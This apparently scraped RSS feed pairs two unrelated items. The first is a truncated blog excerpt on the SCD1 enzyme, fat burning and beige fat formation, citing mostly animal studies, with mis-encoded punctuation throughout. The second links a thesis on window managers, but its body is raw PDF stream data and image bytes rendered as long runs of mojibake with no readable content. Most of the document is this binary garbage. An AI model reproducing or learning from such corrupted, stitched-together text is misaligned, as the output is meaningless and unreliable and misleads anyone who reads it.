<p><img src="https://i2.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/SCD1.jpg?resize=343%2C274&amp;ssl=1" alt="" width="343" height="274" srcset="https://i2.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/SCD1.jpg?w=500&amp;ssl=1 500w, https://i2.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/SCD1.jpg?resize=300%2C240&amp;ssl=1 300w, https://i2.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/SCD1.jpg?resize=150%2C120&amp;ssl=1 150w" sizes="(max-width: 343px) 100vw, 343px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/SCD1.jpg?w=500&amp;ssl=1 500w, https://i2.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/SCD1.jpg?resize=300%2C240&amp;ssl=1 300w, https://i2.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/SCD1.jpg?resize=150%2C120&amp;ssl=1 150w" data-lazy-src="https://i2.wp.com/www.geneticlifehacks.com/wp-content/uploads/2020/12/SCD1.jpg?resize=343%2C274&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>Saturated and unsaturated fats are also found in foods that you eat. Stearic acid is found in beef fat (tallow), chocolate (cacao butter), and dairy fat. Palmitic acid is found in palm oil.</p>
<p>Iâ€™ll come back to the dietary aspects of SCD1 in the Lifehacks sectionâ€¦</p>
<p><strong>Does SCD1 alter your ability to burn off stored fat?&nbsp;</strong></p>
<p>To lose weight, you have to use your stored fat for energy at a rate that is higher than your rate of replacing that fat.</p>
<p>Researchers discovered that <strong>SCD1 (stearoyl-CoA desaturase) is increased in people with obesity and metabolic syndrome.</strong> Additionally, people who are obese have higher ratios of monounsaturated fat to saturated fat (MUFA:SFA ratio).[<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5701860/" target="_blank" rel="noopener noreferrer">ref</a>][<a href="https://pubmed.ncbi.nlm.nih.gov/30754064/" target="_blank" rel="noopener noreferrer">ref</a>]</p>
<p>The question, though, is whether the increased SCD1 caused obesity or whether it was elevated in response to having metabolic syndrome.</p>
<p>Animal research may give us the answer. Research consistently shows that lower SCD1 levels keep the animal lean, even on a diet that normally would make them fat. The researchers decrease the SCD1 levels through manipulating the gene in various tissues of the animal, seeing the results of knocking out the gene in different organs.</p>
<p><em>Why does a lower SCD1 level keep mice lean?</em> The lack of SCD1 enzyme causes an increase in the rate of using up fat for fuel in the mitochondria. This increased fatty acid Î²-oxidation is through activation of the AMPK pathway.[<a href="https://pubmed.ncbi.nlm.nih.gov/31241768/" target="_blank" rel="noopener noreferrer">ref</a>]</p>
<p>decreased SCD1 = increased burning of fat</p>
<p>Additionally, mice with <strong>SCD1 deficiency had better insulin sensitivity and reduced liver fat</strong>. They were â€˜hypermetabolicâ€™, burning off fat at a faster rate, irrespective of a fattening diet. The researchers were able to pinpoint that the <strong>deletion of SCD1 in skin and muscle tissue</strong> is what keeps the mice lean through increasing overall metabolism.[<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5701860/" target="_blank" rel="noopener noreferrer">ref</a>][<a href="https://pubmed.ncbi.nlm.nih.gov/31241768/" target="_blank" rel="noopener noreferrer">ref</a>]</p>
<p>While <strong>decreased SCD1</strong> gives the benefit of decreasing weight gain, it also <strong>increases oxidative stress in the mitochondria and stress in the endoplasmic reticulum</strong>. Specifically, it seems that the decrease in oleic acid drives the ER stress, while low palmitoleic acid does not seem to matter.[<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5701860/" target="_blank" rel="noopener noreferrer">ref</a>]</p>

<p><em>Letâ€™s dig into some more details hereâ€¦</em></p>
<h4><span id="Liberating_fat_from_your_adipose_tissue"></span>Liberating fat from your adipose tissue:<span></span></h4>
<p>Lipolysis is the release of fatty acids from adipose tissue for use in the body as energy or in other ways.</p>
<p>Most cells in the body get replaced at the end of their lifecycle. This happens quickly for some cell types, like intestinal cells that turn over in a matter of days, and more slowly for other types, like heart cells which turnover very slowly, if at all.</p>
<p>Adipose cells are around for about 9 years, on average. Interestingly, the fat stored in adipose tissue has an average age of 1.4 years. This means that once the fat is stored, it doesnâ€™t get used up and replaced very fast. As people who are obese get older, the usage of fat from fat cells for fuel tends to slow down and accumulation speeds up a bit.[<a href="https://pubmed.ncbi.nlm.nih.gov/21947005/" target="_blank" rel="noopener noreferrer">ref</a>]</p>
<p>The SCD1 enzyme is key in the fatty acid composition in your adipose tissue. Animal studies show that knocking out the SCD1 gene alters the fatty acid make up of adipocytes.[<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5625094/" target="_blank" rel="noopener noreferrer">ref</a>]</p>
<h4><span id="Brown_fat,_beige_fat,_and_white_fat"></span>Brown fat, beige fat, and white fat:<span></span></h4>
<p>Brown fat, found in small amounts in adults, is an active type of fat cell that burns through a lot of fuel and produces a lot of heat. Lean people usually have more brown adipose tissue, and people who are obese usually have little to no brown fat. Brown fat is brown due to the high number of mitochondria in each cell, and it helps to both produce heat and burn off excess energy.[<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7034754/" target="_blank" rel="noopener noreferrer">ref</a>]</p>
<p>White fat (white adipose tissue) is what you typically think of for fat cells. It is a storage cell, keeping fat on board for a time of famine. Not as many mitochondria, not producing the heat or energy that the brown fat does.</p>
<p>Recently, researchers discovered that white adipose tissue can be induced to become more like brown adipose tissue. This in-between fat cell type is termed beige or brite adipose tissue. Exposure to cold is one way that white adipose tissue can be induced to become the heat-producing, metabolically active beige fat.[<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7034754/" target="_blank" rel="noopener noreferrer">ref</a>]</p>
<p>A 2020 research paper published in <em>PNAS</em> shows that when adipose cells are formed from stem cells, they can take two paths: white or beige. SCD1 is key to which path the stems cells take. The animal study showed that decreased SCD1 caused the stem cells to differentiate into beige adipose tissue, rather than white. The decreased SCD1 only affected the formation of new adipose cells â€“ it didnâ€™t convert existing white adipose tissue to beige.[<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7007576/" target="_blank" rel="noopener noreferrer">ref</a>]</p>
<p>Succinate is an intermediary formed when the mitochondria produce ATP in the electron transport chain. The researchers also found that the rising succinate levels due to the lack of SCD1 were the trigger for beige adipose differentiation. In cell culture, succinate alone is capable of causing adipose stem cells to differentiate as beige cells instead of white. The increase in succinate accompanies an increase in reactive oxygen species (ROS) in the cell.</p>
<p>To bring this full â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.geneticlifehacks.com/scd1-a-lynchpin-of-metabolism/">https://www.geneticlifehacks.com/scd1-a-lynchpin-of-metabolism/</a></em></p>]]>
            </description>
            <link>https://www.geneticlifehacks.com/scd1-a-lynchpin-of-metabolism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495335</guid>
            <pubDate>Mon, 21 Dec 2020 14:44:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The anatomy of the modern window manager (2019) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495304">thread link</a>) | @a-nikolaev
<br/>
December 21, 2020 | https://www.cs.ru.nl/bachelors-theses/2019/Max_van_Deurzen___4581903___The_anatomy_of_the_modern_window_manager_-_a_case_study_for_X_in_an_Agile_manner.pdf | <a href="https://web.archive.org/web/*/https://www.cs.ru.nl/bachelors-theses/2019/Max_van_Deurzen___4581903___The_anatomy_of_the_modern_window_manager_-_a_case_study_for_X_in_an_Agile_manner.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>Ã•Ã˜c/Ã¨Ã±/gâ€šÃ¡
endstream
endobj
462 0 obj
&lt;&lt; /Filter /FlateDecode /Length 709 &gt;&gt;        
stream
xÃšâ€¢â€Ã‰nÃ›0â€ Ã¯~
Â¥Æ’Ã®{jâ€“Â¦hÅ mÃ£â€šâ€°Â±â€¦Ãšâ€"ÃŠNï¿½Â§Ã¯Hâ€Ã¬8Â±Ã›â€ =\fÃ¾â„¢ï¿½Å¡&nbsp;"Ã¨Ã£â€Â±gÃ“Ã‰Ã‰%Ã¥Qï¿½â€¢B&nbsp;Ã©Ã½â€Ã‚A1Â¦Â°Ã–iÂ£Â°bhÂºD7Ã‘Y3Ã¥sÂ»Â¨Å¡8Ã¡ZGÃ­ÃœÃºÃ’Ã‡Â·Ã“Â«] Ëœqâ€°tJÃ€Âªy^-Ã«U[ÂºYÂ»ÃKÃ«rÃ›Ã‡}ËœÃ®BÂ¥Ã„ZÂ¥Hqï¿½â€°(_N&amp; Â¢YÃ¯Â°Ãµ\rLD?Å’Å’Ã«'Å¸â€“]Tâ€œoÃ°uâ€œQ8yÂ¦Â¼Â£Ëœâ€¹Ã±9&lt;Ã‡jWâ€aFâ€ Ã¯YqWÂ­Å @Ã°Ãƒâ€¢kÃ›Ã¸Â²ÃÅ’Ã›h	'f8â€™)Ã‡JuÂ©nnaÂ½â‚¬Ã¯"Ëœâ€º=Ã¶Å¾K$RÅ SÃƒÂºâ€ zâ€¡â€™Ã´ÃÂ¡Ta!Â¨Lâ€¢5MÃ§ÃªQ*ÃŠ\Ã–VÃ‹M7Ã‘Qul;Ã®.+Â°4*lÃ£Ã‚Ã‚cÃ©Å *f&amp;z ~fâ€ºÅ¾e(ï¿½b#%Ã•Â¯J&nbsp;Pâ€šÃ ËœÂ§2â€pÃ²ÃŒÃ›ï¿½Ã•Â·Â«bÃ‹8Â¡Ã‘ï¿½Â²Â°kÃ¨â€º:Ã´Â¸eÃÂ¸
â€“Æ’G[Ã•Ã‰Ã‚S5Â¶ÃbNÃ€ÂºÂ¡sÃ€gQÃº6Â¹Æ’\Ã…^Ã“Q%Â±4H2Æ’Ã“Â±Ã§ÃšrÂ±
;Ã†Ã›OÃ®Ã»ï¿½~"Â£Å¸!yÃ©â€ *â€¡ÃªOgÃ¥Â¢Æ’Â±Ã›x7Ã—ÃÂ«Â§ÃÃ¿Ã§Ã®?NA^â€NAÅ¾"!Â¡Ã¨Ã¶ËœÅ½VÃ­Â¼ÃªlÃ³n{â€¢Ã¦Â¯
\Ã­Å¡Ã©KÃ¶Ã¨ËœÅ Ã–=5.Ã¬ÂªyÂ²nÃ¯Â¨Ã‡HOcÃ¸_Ã°BÂ¦Ã”ÃÃ»Â½9NÃï¿½Ã€â€™â€°}Å’Ã‹Â²Ã±mÃˆÃ®WuÅ“Å’mÃ–}#Ã¹â‚¬vâ€™yoÂ½ghÃŸ-'â€šÃ‹Ã¨|Ã£Ãšyâ„¢â€¦tÅ¸cÃ¸Â©ÃªQPÂ°#â€šPÂ¬NÃ·Ã¸sÃ¼Â«ÂªÃŸÃ§7+Ã¬[ï¿½ÃƒÃ”â€šAo(Ã„5Ã…â€šÃ‘ pmÃ³ÃŠÂ¯Â©;HÃµHï¿½i*â€”-^@~Ã­ÃŠÂ¶}Â·Æ’Ãši'â„¢Ã[wOÃ³Â°Â°Â¨ï¿½â€™ÃƒÆ’â€”lxW5ÃÂºpÃ·
Ã¸Hu,`Ãï¿½2Ëœ04Â¡Ã¦`Â·Ã€kÃº)ï¿½Y
endstream
endobj
460 0 obj
&lt;&lt; /Type /XObject /Subtype /Image /Width 1471 /Height 1750 /BitsPerComponent 8 /ColorSpace /DeviceRGB /SMask 470 0 R /Filter /FlateDecode /Length 605281 &gt;&gt;     
stream
xÃšÃ¬ÃTTÃ—ÃšÃ¿qÂ½Ã—a@zÃ¯ 
â€š"`Ã¯Â½wï¿½Â½Ã·Ã{ï¿½1â€“Ã˜EÂ±â€”Ã˜[,Â±TÂ°bÃEâ€˜ÂªÃ·Â¿â€¡cÂ¸Ã¾sÃŸÃ¸Ã¦5Å¡;ÃŠÃ·Â³Å¾5wÂ¢0sfÅ¸3Â®ÃµÃ¼Ã®&gt;{Ã¿Ã«_Ã€Â·Ã©]ï¿½Â·Ã²â€”WÂ´â€°ï¿½DÅ’WE\NNNFFÃ†Ã³Ã§ÃÂ¤Â¤ÃœÂ¼y3)))Ã±jÃ¢Ã•+W.)%\JÂ¸Å“pÃ¹â€ºwÃ¥Ã²eÃ±a/Å“?/J&lt;Â¿uÃ«Ã–Æ’Ã„ËœÂ¼yÃ³Ã¦Ã­Ã›Â·Ã’@Â¤P4edd<yÃ²Ã¤Ã¦ÃgÃÅ“Ã™Â·wÃ¯Å½Ã­Ã›Â·nÃ™ÂºyÃ“Â¦ÃµqÃ«Ã–Ã…Ã…Â­_Â·nc|Ã¼Ã†Ã¸ ÃŸ|Ã…Â­ï¿½[ÂµbÃ¥Âª+6mÃ˜x`Ã¿Ã¾Â³gÃÃÂ¼yÃ«Ã…â€¹Ã¹Ã¹Ã¹Ã’@Å¾ï¿½ï¿½ï¿½ï¿½ï¿½p4Â½h}qÃ»Ã–Â­Ã“Â§nnÃ›Â²eÃ¡?ÃŒÅ“6mÃŠÂ¤Ã‰Ã‡ï¿½9|Ã„Ë†Â¡Ãƒfï¿½1fÃ”Ã¨Â±Â£Ã‡|Ã³5|Ã¨Ã}Ã»â€°?fÃ¬Ã¢e?nÃ›ÂºÃ­Ã´Â©Ã“<ÃˆÃÃÂ£Ã´Â®Ã Ã¶&Â®ï¿½ï¿½ï¿½ï¿½ï¿½Å Â Ã‡ï¿½_8~Ã§Å½Ã­Ã³Ã¦ÃŒÃ©Ã“Â«wÂ»6Â­[6kÃÂ¤aÂ£Å¡Ã•ÂªwÂ¯rÂµvÃµÃµjÃ—Â©_Â§Ã®7_Ã•bÂ«dâ€ uË†="" oxÂ¯Ã¾â‚¬~Ã½Ã¦Ãï¿½Â·sÃ‡Ã7ndggÃ¿Â«="" <)Â¼ï¿½ï¿½ï¿½ï¿½ï¿½)Ã·Ã®Ã;~Ã¬Ã˜Ãªâ€¢+â€¡="" rÂ¯vÃ­ÃˆÂ°Ã°ÃÂ Ã @_?'';{w'g="" 7wowÃoÂ½<lÃ­d&f2s?="" Ã¯Ã†="" ="" :lÃµÃŠÃ•="" yyyÃ¿"<ï¿½ï¿½ï¿½ï¿½Â Â»{Ã§Ã®â€˜Ãƒgâ€“-]ÃšÂ¿oÃŸÂª11Ãï¿½="">Å¾^nN.VrÂ¹â„¢Â¹ÂµÃœÃ’ÃÂ¦Â´CiÃ›oÂ¾,LÃt4Â´tÃ”5ï¿½Ã­jUÂ¯&gt;Â°_Ã¿eKâ€”]Â¼pÃ¡Ãâ€º7Ã¿"&lt;&nbsp;Â»{Ã·Ã®/GÅ½,Ã¿Ã©Â§Ã½ÃºUï¿½Â­RÂ¶Lï¿½Å¸â€”Â·â€¡â€¹Â«ï¿½Â¥B!Â³(Â­Â°rÂ´ÂµsÂ²Â³Ã¿Â¶K|FKsâ„¢Å¾â€“Â¶Å¾Â¦Â¶Â«Â£Sï¿½5Ã¶Â°Ã¼Â§e/^|Å¾Â¼#&lt;&nbsp;Ë†Âº{Ã§Ã®/G~YÃ¾Ã“Â²}	O&gt;OÃº+Ãƒâ€œÃ‚â„¢'â€'Uwâ€™Ã¯:xxÃ©Ã¢%}zÃ¶Å Å½Â¬Ã¤Ã§Ã­Ã£Ã®Ã¬Ã¢Â¨\Ã„Ã”Ã”Ã€ÃÃ‚Ã”ÃŒZnicÂ©Ã¸Â¶K|F}ÂµÃ¢%Ã”Å â€¢Â°Â³Â¶Â©Ã›Â·wo1&amp;ÃÅ¸'&lt;&nbsp;Ë†+O-YÂ´Â¸wï¿½Å¾â€¢#+ÃºzyÂ»99;â€Â¶5726Ã–7ï¿½â€ºXYÃˆÂ­Ã¥â€“ÃŸvYÃ‰,Å’Ã´Ã´K+.ÃŠÃ–ÃŠÂºjtLÅ¸^Â½Ã„ËœÅ¾â‚¬Â»Ã‰w:Ã¼Ã“Ã¢Â¥}{ÃµÅ½Â©Ã Ã«Ã§Ã©ÃªÃ¦lÃ¯`ajffd,73/mÂ©Â°UX}Ã›ecÂ©054Ã’(YJÂ£D)â€¡Ã’Â¶Ã•cÂ«Ã´Ã«Ã“Ã§'fÅ¾â‚¬Ã¯Â¶Ã³SÃ¿&gt;}Â«FÃ‡ÃºxxÂº99Â©ÃvÃ„g,Ã˜mGÃ³Ã½n;Ã•ÂªÃ¨Ã—OÅ’	kÅ¾Ã‚Ã‚Ã°â€'â€'Ã #OOÃ€GÅ¾Å¾â‚¬ï¿½ <!--<ï¿½ï¿½ï¿½ï¿½ï¿½AxBxï¿½ï¿½ï¿½ï¿½ï¿½-->â€šÃ°â€Ã°|Ã¡	Ã¡	Ã¸Ã‚Ã‚Ã°â€'â€'Ã #OOÃ€GÅ¾Å¾â‚¬ï¿½ <!--<ï¿½ï¿½ï¿½ï¿½ï¿½AxBxï¿½ï¿½ï¿½ï¿½ï¿½-->â€šÃ°â€Ã°|Ã¡	Ã¡	Ã¸Ã‚Ã‚Ã°_4<qÂ´Âµâ€œÂ¢ ;k[+Ã«Ã’="" +kâ€¦xmÂ©Ã„[Ã¼_kÃ¼â€“xÃ±:Ã¢Ã•Ã„kÅ wÃ¾,Ã™Ã¡="" ï¿½ï¿½ï¿½ï¿½ï¿½Ã¸3_.<qÂ²Â³Ã¥hkggmccÂ©Â°4â€”â„¢â€ºÃ«Ã¨Ã¨hÃ«Ã¨â€¹Ã’Ã’Ã–+(Ã±d_Ãºâ€œÃ¿Â±Ã„ÃhjÃ©jhâ€°gÃ±Â»Ã†ÃºffÃ†Ã’Â±f(rp#e5â€'ï¿½ï¿½ï¿½ï¿½ï¿½Ã 3ÃºÂ¢Ã¡â€°Â³Â½Æ’xÂ´ÂµÂ²Â¯&315Ã–7ÃÃ•Ã”Ã’*Â¥Â¦yÂ²â€(ï¿½%Ã•â€¹â€”t="" qrcyÂ¥Ã¾Â¬Ã„Â¨="" qÂªxqÃ±Â¨uj]osÃ‹pwÃÃŒÃˆx!Â³(Â­Â°"<ï¿½ï¿½ï¿½ï¿½ï¿½_Ã”â€”oÂ¤4câ€x[+kkâ€¦Ã´Å¡&f2sÂ©ÃŒï¿½mdÃ¾Ã§Ã¿\Ã†?fÂ¤Ã¼is3Ã±="" â„¢Ã…â€¡Ã“noï¿½ï¿½ï¿½ï¿½ï¿½Ã€â€”Ã³Ã¥Ã‚iï¿½Ã±Ã¨lÃ¯Ã Ã¡Ã¢ÃªÃ«Ã©Ã¤p="">$4Â¢|XdXxdxxÃ…
â€¢""*UË†O*â€ WÃ¸Ã“ÂªYÂ¹b%Ã±(~Â·|Ã™ï¿½Ã Ã€2Ã¾Ã&gt;Å¾Â®n.Å½Nvâ€¦+Â«|Ã²Â¡Å¾â‚¬?Ã³â€¦Ã‚Ã±[6â€“
â€¦ÃŒB&lt;Âº;Â»Ã¹TÂ¬PÂ¡vï¿½Â­[Â´Ã¬Ã’Â±SÃ—Ã]ÂºuÃ©Ã’Â³[Â·Ã=zÃ¶Ã®Ã‘C&lt;Ã©Ã‘ÂµÃ«Å¸UÃnÃÃ»ÃµÃ®=Â°_Ã±Ã˜Â¹CÃ‡â€“ÃÅ¡Ã—Â¯S76ÂªrÃ™Ã€2^Ã®Ã¢Pï¿½Ã­Â¤Ã‰-Â¢&gt;Ã¹h	OÃ€Ã¿Ã¨â€¦'vÃ–6Ã’
Â±
â„¢â€¦â€”Â»Gdxâ€¦ÃºuÃªvÃ­ÃœyÃœËœ1sfÃÃº~ÃÂ¼Ã³Ã¦/ZÂ¸Ã°Â§%Kâ€“.^"Å¾Ã¼Â¸Ã â€¡?Â«Ã…?Ã¾Â¸rÃ¹Ã²ukÃ–Å Ã‡Ã™3gÅ½9ÂªwÃÅ¾-Å¡6â€¹Å Ë†Ã°ÃµÃ³tuwutâ€™Â²QÃ¢}	OÃ€gÃ´â€¦Ã‚[+kâ„¢â€°Â©â€˜Å¾Â¾â€¦Â©â„¢Â¿ï¿½oï¿½ÂªÃ•:wÃ¨8qÃ¼Ã¸Ã¸uÃ«8pÃ¬Ã¨Ã‘Ã£Gï¿½ï¿½9}ÃºÃ¢â€¦ÃÅ¸ONï¿½&lt;Ã¹guÃ¶ÃŒâ„¢Â«â€”Â¯ÃœÂºqC&lt;Ã˜Â¿Ã­Ãª5Â³gÃŒG[Â§FÃÃ&nbsp;`_OoW;kâ€¦ÃŒBÂ³x_Ã‚Ã°}Â¹Ã°Ã„Ã„Ã€PWSÃ‹ÃŒÃˆXÂ¼fÃ£â€ ï¿½â€ Â¼rÃ¹Ã²K/&gt;{Ã¶,=-Ã­UzznNÅ½JË†'Ã™YYVyÂ¹Â¹â€¦GÃ»Ã¤Ã±Ã£Â³gÃlÃÂ¸qÃšÃ¤)-â€º6â€¹Ã´ÃµÃ·rsÂ·Â³Â¶Gki.#&lt;Å¸Ã—
OJ+Â¬Å’Ãµ
Â´Ã•4LÃ‹â€“iÃ‘Â´Ã™ËœQÂ£6nÃ˜pÃ§NÃ²â€¡aÃˆÃ¿UvvÃ¶ï¿½kÃ—Ã·Ã®Ã™3oÃ¶Å“vÂ­ZWÂ¬QÃ†/Ã€Ã›ÃÃƒÃÃšFÃšË†GÂ¼/Ã¡	Ã¸Å’Â¾lxÂ¢Â®ajhXÂ¦yâ€œÂ¦Â£GÅ½Å’_Â¿Ã¾Ã–Â­â€ºÃ™YYÃ¯ÃÂ½Ã»Â´Â£ÃÃŒÃŒLJLÃœÂ½kÃ—Å“YÂ³Ã›Â¶lÃµâ€¡Ã°Ã„Ã’\Fx&gt;Â¯/Å¾ËœÃªÂ¨k*Ãƒâ€œâ‚¬Ã€Â¦ï¿½ï¿½6lÃ­Å¡5â€°â€°WÃ“Ã“Ã’Â²Â²Â²Â²Â³Â³?&lt;Å’wÃ®ÃƒKMMÂ½tÃ±Ã’Å½mÃ›fNÅ¸Ã‘ÂºyÃ‹ÃˆÃ°
eÃ¼Ã¼	OÃ€â€”Ã³ï¿½â€¦'#â€¡ï¿½[Â»Ã¶ÃºÃµkÂ¯32rssÃ³Ã²Ã²&gt;Ã¡hÃ“Ã“Ã“Â¯\Â¾Â¼sÃ»Å½Y3fÂ¶iÃ‘Å Ã°|i_6<q{Å¾4kÃœdÃ”Ë†Ã«Ã—Â­Â»yÃ³Ã†â€ºÃŒÃŒÃ¼Ã¼Ã¼oÃ‹"222Â®^Â½Â²kÃ§ÃÂ³gÃjÃ“bÂºmâ€¡Ã°ï¿½ï¿½ï¿½ï¿½ï¿½|aÃ¿ÃŒÃŒâ€œfï¿½â€ºÅ’>|]\Ãœï¿½Ã—3_Â¿ÃÃ‹Ã‹Ã‹ÃÃÃ¿â€Â£}ÃµÃªÃ•â€¢+â€”ÃÂ±S
OËœyÂ¾Â´rÃâ€œÂ¸ÂµkÂ¯]KÃŠxÃµ*'''Ã·â€œÃ¶ÃœIKKÂ»Å“ï¿½Â°sÃ»Ã–&lt;Ã¿Å’xÃÃ˜Â¤Â¤Ã„WÃ©Ã©Ã™Ã™Ã™999Å¸pÂ´/_Â¾LÂ¸tiÃ‡Â¶Ã­â€'Ã Å¸AxBx&gt;â€šÃ°â€Ã°|Ã¡	Ã¡	Ã¸Ã‚Ã‚Ã°â€'â€'Ã #OOÃ€GÅ¾Å¾â‚¬ï¿½ <!--<ï¿½ï¿½ï¿½ï¿½ï¿½qÃ¿ÃÃ½_Å½Ã¼Â²Ã¼Â§eÃºÃ¶#<)OÃ¶Ã¯/Ã†Ã¤Ã’Ã…â€¹Ã¢PÂ¹Hï¿½ï¿½ï¿½ï¿½ï¿½(ÃŠ-->xxÃ¢Ã¸â€°U+VÃ¬Ã—Â¿ZLlp`â„¢"Å¾hÂ«khÂ«i8Ã›;Ã”Â®^cÃâ‚¬bLÂ®^Â¹â€™Å¸Å¸ÃE@QÃ¶Ã¤Ã±â€œ_OÃ¼ÂºzÃ¥ÂªAÃ½T'&lt;)OÃªÃ”Â¨9xÃ @1&amp;Iâ€°â€°Ã¯ÃÂ½Ã£"&nbsp;({ï¿½Ã²Ã Ã˜Ã‘c+â€“-â€”fÅ¾pÃ›NÃ¡ÃŒ1&amp;â€”rssÂ¹HÃ¸Å’ÃÂ½{â€”Å¸Å¸Å¸â€”â€”'Å¡Ã®AÂ¨qlÃ¹rsroÃÂ¸y`Ã¿ï¿½%â€¹Ã·Ã­Ã•Â»JÃ¥Ã¨ Ã¿â‚¬"Å¾Ã¨jjÃ©jh9Ã›;Ã”Â¬ZÂ­_Å¸&gt;bLÃÅ¾9â€œÅ¾â€“Â¦&lt;ï¿½Ã™Ã™YYYÂ¹â€™Å“ÃœUÂ¥&lt;Â³yyoÃŸÂ¾eÃ‚@Eâ€œâ€œ)Ã·dÃ‰Ã‹Sâ€ ÃŠvÃ»MÃ–â€ºY*FÂ´Ã˜Rs-Ã²ÃºÂµÃ«Ã»Ã¶Ã®[Â´Ã°Ã‡&gt;={Ã…VÅ½.Ã³AxbYTÃƒâ€œUÂ«Ã¶Ã­Ã{Ã±ï¿½?Å¾&gt;u*555+;[Å“Ã„ÃŒÃŒL)&nbsp;ï¿½â€šâ€Ã¿Â¾7UÃ¸_â€”â„¢8:)#&lt;Â¨lxâ€™â€”â€”â€”â€œï¿½#:Ã™Å’Å’Ã—Ã©iÂ¯Ã’^Â¦Â§Â¥Â¥Â¥+Â½Rï¿½â€¡â€”Å¸Â¯Å“Å“ï¿½â€˜â€˜qÃ¥Ã²â€¢]?Ã¯ÃºÃ¡Ã»Â½ÂºÃ·Ë†â€°Âª,eÂ®Å½NÃ–rÃ‹Â¢Å¾Ë†â€™â€ºâ„¢+ÃƒMexRÂ½Jâ€¢Ã={.\Â°Ã Ã„Ã±Ã£OÅ¸&gt;}â€¢â€˜!NÂ¡8ï¿½Â¯_gÅ Æ’Â¦2Â§Â²Ã°ÂºRÃÂ«WÃ©Â¯_Â¿â€“Ã‚16VÂ¨Â¦Â·Ã¯ÃÂ¾yÃ³Ã¦eÃªÃ‹'ï¿½Å¸ÃœÂ½{Ã¯Ã†ÃµIâ€°IIIÃ—Ã„â€œâ€º7nÂªNÃÂ»{Ã¯Ã©â€œÂ§Â¿=Ã»Ã­Ã¶Â­Ã›Gâ€°[Â³vÃªÃ¤)ï¿½;tÂ¬Ã Ã£Ã«Ã¥Ã¦.â€¦'
sYÃ‘	OÃ„Ã¯ÃªkÃ«Ë†rÂ²Â³ï¿½Â­\Â¹KÂ§NÃ“Â¦LÃ™Â±}Ã»â€¢+â€”oÃÂºuCÂ¸~Ã£NÃ²QbÃTÃ¡$ÃÂ¸!Å½ÃªÂ¦Ã¤ÃºÃµÃ—Â®%â€°?ÂºÃ¯ÃÂ³Â§OÃ…ÃšÃ°Ã°â€'ÃÅ¸?ï¿½Ã­Ã©SÂ§Ã·Ã¬ÃÂ³~Ã­Âºâ€¢Ã‹VÂ¬ZÂ¹j}ÃœÂºï¿½Ã±TÂ§Â¶mÃÂ¶wÃÃÃ½Ã»Ã¶oÃšÂ¸iÃ¡â€š&amp;Å’ÃŸÂ»GÃâ€ ÃµÃªâ€”+Ã¢Ã£Ã¡Ã©Ã¡Ã¢ÃªlÃ¯PZaem!ï¿½E$&lt;Â±Â²ï¿½â€¹CÃ¥dg^Â®\Â£
ÃºÃ´Ã¬9kÃ†qÃŒ7nÃœÂ¿a}Ã¼â€“Ã[Dâ€°ASâ€¦â€œÂ¿^â€Ã¸Å¸
Â¢Ã¢Ã–Ã†Â­^Âµ*~ÃÂºÃ½{Ã·Å¾?wÃ®Ã®ï¿½;Ã©Ã©Ã©|*(Ã¿m~JJÃŠÃ‰_OnÃÂ¸Ã©Ã»yÃ³GÃÂ·WÅ¸Ã½Ãºï¿½6|Ã¬Â¨1ÂªSÃ‡OËœ1mÃºÃŒÃ©3Ã†ï¿½Ã›Â¿oÂ¿Ã:6iÃ˜(Â¦RT&nbsp;Â¯Å¸â€¡â€¹Â«Â«Â£â€œâ€œï¿½Â½Â­â€¢uiKâ€¦x,"Ã¡â€°ï¿½Â¥BÂ¼â€š(G[Â»&nbsp;â‚¬â‚¬ËœÃŠâ€¢â€º6jÃ”Â³{Ã·â€˜Ãƒâ€¡ï¿½3fÃŒÃ¨Ã‘cFï¿½Å¾0nÂ¼(1hÂªpGï¿½=zÃ¤(qTÂ¢â€ 
